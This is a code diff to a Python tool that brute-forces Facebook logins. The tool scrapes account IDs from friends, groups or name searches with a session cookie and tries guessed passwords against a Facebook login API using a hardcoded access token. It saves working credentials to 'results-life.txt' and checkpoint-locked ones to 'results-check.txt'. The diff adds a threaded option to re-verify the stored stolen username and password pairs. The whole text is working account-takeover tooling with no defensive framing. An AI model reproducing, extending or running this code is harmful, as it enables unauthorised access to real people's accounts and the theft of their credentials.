@@ -13,6 +13,8 @@ mbasic = 'https://mbasic.facebook.com{}'
 global die,check,result, count
 id = []
 die = 0
+chek = []
+life = []
 count = 0
 check = 0
 result = 0
@@ -44,7 +46,7 @@ def masuk():
                 return cek["cookie"]
         else:
                  exit("# cookies invalid")
-def login(username,password):
+def login(username,password,cek=False):
         global die,check,result,count
         b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
         params = {
@@ -64,18 +66,24 @@ def login(username,password):
                 print(f"\r[LIFE] {username} => {password}                       ",end="")
                 print()
                 result += 1
-                with open('results-life.txt','a') as f:
-                        f.write(username + '|' + password + '\n')
+                if cek:
+                        life.append(username+"|"+password)
+                else:
+                        with open('results-life.txt','a') as f:
+                                f.write(username + '|' + password + '\n')
         elif 'www.facebook.com' in response.json()['error_msg']:
-                print(f"\r[CHEK] {username} => {password}                       ",end="")
+                print(f"\r[CHEK] {username} => {password}                    ",end="")
                 print()
                 check += 1
-                with open('results-check.txt','a') as f:
-                        f.write(username + '|' + password + '\n')
+                if cek:
+                        chek.append(username+"|"+password)
+                else:
+                        with open('results-check.txt','a') as f:
+                                f.write(username + '|' + password + '\n')
         else:
                 die += 1
         for i in list('\|/-•'):
-                        print(f"\r[{i}] life : ({str(result)}) checkpoint : ({str(check)}) die : ({str(die)})                        ",end="")
+                        print(f"\r[{i}] life : ({str(result)}) checkpoint : ({str(check)}) die : ({str(die)})",end="")
                         time.sleep(0.3)
 def getid(url):
         raw = requests.get(url,cookies=kuki).content
@@ -147,6 +155,7 @@ if __name__ == '__main__':
                 print('3 By search name ')
                 print('4 From group ')
                 print('5 From friend')
+                print('6 Results check')
                 print()
                 tanya = input('# Get id from : ')
                 if tanya =="":
@@ -185,6 +194,32 @@ if __name__ == '__main__':
                                 username = getid(mbasic.format(user))
                         except TypeError:
                                 exit("# user not found ")
+                elif tanya == '6':
+                        try:
+                                file1 = open("results-check.txt").read()
+                                file2 = open("results-life.txt").read()
+                                a = file1 + file2
+                                final = a.strip().split("\n")
+                                final = set(final)
+                                print(f"# {str(len(final))} accounts to check ")
+                                with ThreadPoolExecutor(max_workers=10) as ex:
+                                        for user in final:
+                                                a = user.split("|")
+                                                ex.submit(login,(a[0]),(a[1]),(True))
+                                os.remove("results-check.txt")
+                                os.remove("results-life.txt")
+                                for x in life:
+                                        with open('results-life.txt','a') as f:
+                                                f.write(x+'\n')
+                                for x in chek:
+                                        with open('results-check.txt','a') as f:
+                                                f.write(x+"\n")
+                                
+                                print("\n# Done")
+                                print("# saved to results-check.txt results-life.txt")
+                                exit()
+                        except FileNotFoundError:
+                                exit("# you not have a results")
                 else:
                         exit("# wrong choice")
                 print()
@@ -203,12 +238,11 @@ if __name__ == '__main__':
                                                 ]
                                         listpass.append(expass)
                                         for passw in set(listpass):
-                        #login(user,'sayang')
                                                 ex.submit(login,(users[1]),(passw))
                 if check != 0 or result != 0:
                         print("\n# Done. file saved in : ")
-                        print("        - life : results-life")
-                        print("        - checkpoint : results-check")
+                        print("        - life : results-life.txt")
+                        print("        - checkpoint : results-check.txt")
                         exit("# thanks for using this tools")
                 else:
                         print("\n# Done")
